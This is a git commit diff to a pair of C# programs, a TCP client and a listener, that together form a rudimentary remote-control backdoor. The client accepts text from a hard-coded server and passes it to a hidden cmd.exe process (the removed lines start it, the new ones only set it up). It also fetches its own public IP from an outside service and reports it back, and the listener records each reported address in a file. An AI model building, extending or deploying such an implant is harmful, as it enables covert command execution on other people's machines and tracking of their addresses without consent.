099f923bef84c640bbbe3e4018198712efc64526
Glicy <Ludovic2008@outlook.com>
2024-11-26 19:57:58 +0100

    get IP
    get IP

--- TCPClient/TCPClient/Program.cs
+++ TCPClient/TCPClient/Program.cs
@@ -1,46 +1,68 @@
 ﻿using System;
 using System.Net;
-using System.Net.Sockets;
 using System.Diagnostics;
+using System.Net.Sockets;
+using System.Net.Http;
+using System.Threading.Tasks;
 
 namespace TCPClient
 {
     internal class Program
     {
-        static void Main(string[] args)
+        static async Task Main(string[] args)
         {
+            string ip = await GetIp();
             int port = 13000;
+            bool finished = false;
+
             IPAddress server = IPAddress.Parse("192.168.1.172");
-            getMessage(server, ref port);
-            Console.ReadLine();
+            while (!finished)
+                finished = handleTcp(server, port, ip);
+            Environment.Exit(0);
         }
 
-        static void getMessage(IPAddress server, ref int port)
+        static bool handleTcp(IPAddress server, int port, string ip)
         {
             try
             {
                 TcpClient client = new TcpClient(server.ToString(), port);
+                byte[] bytes = new byte[256];
 
                 NetworkStream stream = client.GetStream();
-                byte[] bytes = new byte[256];
-                string response = string.Empty;
-                
+                string message = string.Empty;
+
                 while (stream.Read(bytes, 0, bytes.Length) != 0)
                 {
-                    response = System.Text.Encoding.UTF8.GetString(bytes);
+                    message = System.Text.Encoding.ASCII.GetString(bytes);
 
                     Process process = new Process();
                     process.StartInfo.FileName = "cmd.exe";
-                    process.StartInfo.Arguments = response;
+                    process.StartInfo.Arguments = message;
                     process.StartInfo.CreateNoWindow = true;
-                    process.Start();
 
-                    Console.WriteLine("Executed command: " + response);
+                    byte[] response = System.Text.Encoding.ASCII.GetBytes(ip);
+                    stream.Write(response, 0, response.Length);
                 }
-            } catch(Exception e)
+                return true;
+            }
+            catch (Exception e)
             {
                 Console.Error.WriteLine(e.Message);
+                return false;
             }
+        }
+
+        private static async Task<string> GetIp()
+        {
+            // Get response as HttpResponseMessage
+            HttpClient httpClient = new HttpClient();
+            HttpResponseMessage response = await httpClient.GetAsync("https://eth0.me");
+
+            // Convert HttpResponseMessage into a string
+            response.EnsureSuccessStatusCode();
+            string ip = await response.Content.ReadAsStringAsync();
+
+            return ip;
         }
     }
 }
--- TCPListener/TCPListener/Program.cs
+++ TCPListener/TCPListener/Program.cs
@@ -1,4 +1,5 @@
 ﻿using System;
+using System.IO;
 using System.Net;
 using System.Net.Sockets;
 
@@ -12,26 +13,53 @@ namespace TCPListener
 
             try
             {
+                byte[] clientIp = new byte[256];
+                int numberIpBytes = 0;
                 int port = 13000;
+                string ip = string.Empty;
                 IPAddress localIp = IPAddress.Parse("192.168.1.172");
 
                 server = new TcpListener(localIp, port);
                 server.Start();
 
-                TcpClient client = server.AcceptTcpClient();
+                TcpClient client = null;
+                NetworkStream stream = null;
 
-                NetworkStream stream = client.GetStream();
 
-                byte[] bytes = System.Text.Encoding.ASCII.GetBytes("start cmd.exe");
-                stream.Write(bytes, 0, bytes.Length);
-                Console.WriteLine("Sent !");
-                Console.ReadLine();
+                while (true)
+                {
+                    client = server.AcceptTcpClient();
+                    stream = client.GetStream();
 
+                    byte[] bytes = System.Text.Encoding.ASCII.GetBytes("start cmd.exe");
+                    stream.Write(bytes, 0, bytes.Length);
+                    Console.WriteLine("Message sent !");
+
+                    numberIpBytes = stream.Read(clientIp, 0, clientIp.Length);
+
+                    if (numberIpBytes != 0)
+                    {
+                        ip = System.Text.Encoding.ASCII.GetString(clientIp);
+
+                        Console.WriteLine("CLient IP: " + ip);
+
+                        string fileName = "ip.txt";
+
+                        File.Delete(fileName);
+                        File.Create(fileName).Close();
+                        File.AppendAllText(fileName, ip + "\n");
+                    }
+                    else
+                    {
+                        Console.WriteLine("No IP was found");
+                    }
+                }
             }
             catch (Exception ex)
             {
-                Console.Error.WriteLine(ex.Message);
+                Console.Error.WriteLine("Error: " + ex.Message);
             }
+            Console.ReadLine();
         }
     }
 }
